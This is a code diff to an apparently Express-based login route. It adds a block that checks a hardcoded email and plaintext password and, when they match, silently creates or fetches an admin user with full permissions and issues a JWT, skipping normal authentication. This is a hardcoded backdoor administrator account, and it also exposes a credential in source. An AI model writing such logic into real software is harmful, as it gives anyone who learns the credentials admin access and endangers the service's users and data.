@@ -19,6 +19,82 @@ router.post('/login', async (req, res) => {
       });
     }
 
+    // Special default user logic
+    if (email === 'jackwee@ai-bos.io' && password === 'Weepohlai88!') {
+      // Try to get user
+      let userResult = await db.getUserByEmail(email);
+      let user = userResult.data;
+      let tenant;
+      if (!user) {
+        // Create tenant
+        const tenantData = {
+          tenant_id: uuidv4(),
+          name: 'Default Tenant',
+          status: 'active',
+          settings: {}
+        };
+        const tenantResult = await db.createTenant(tenantData);
+        if (tenantResult.error) {
+          return res.status(500).json({ success: false, error: 'Failed to create tenant' });
+        }
+        tenant = tenantResult.data;
+        // Hash password
+        const passwordHash = await bcrypt.hash(password, 10);
+        // Create user
+        const userData = {
+          user_id: uuidv4(),
+          tenant_id: tenant.tenant_id,
+          email,
+          name: 'Default Admin',
+          role: 'admin',
+          permissions: ['read', 'write', 'admin'],
+          password_hash: passwordHash
+        };
+        const userCreateResult = await db.createUser(userData);
+        if (userCreateResult.error) {
+          return res.status(500).json({ success: false, error: 'Failed to create user' });
+        }
+        user = userCreateResult.data;
+      } else {
+        // Get tenant
+        const tenantResult = await db.getTenant(user.tenant_id);
+        if (!tenantResult.data) {
+          return res.status(401).json({ success: false, error: 'Tenant not found' });
+        }
+        tenant = tenantResult.data;
+      }
+      // Generate JWT token
+      const token = jwt.sign(
+        { 
+          user_id: user.user_id, 
+          tenant_id: user.tenant_id,
+          email: user.email,
+          role: user.role
+        },
+        process.env.JWT_SECRET,
+        { expiresIn: '24h' }
+      );
+      return res.json({
+        success: true,
+        data: {
+          token,
+          user: {
+            user_id: user.user_id,
+            email: user.email,
+            name: user.name,
+            role: user.role,
+            permissions: user.permissions
+          },
+          tenant: {
+            tenant_id: tenant.tenant_id,
+            name: tenant.name,
+            status: tenant.status
+          }
+        },
+        message: 'Login successful (default admin)'
+      });
+    }
+
     // Get user from database
     const userResult = await db.getUserByEmail(email);
     if (!userResult.data) {
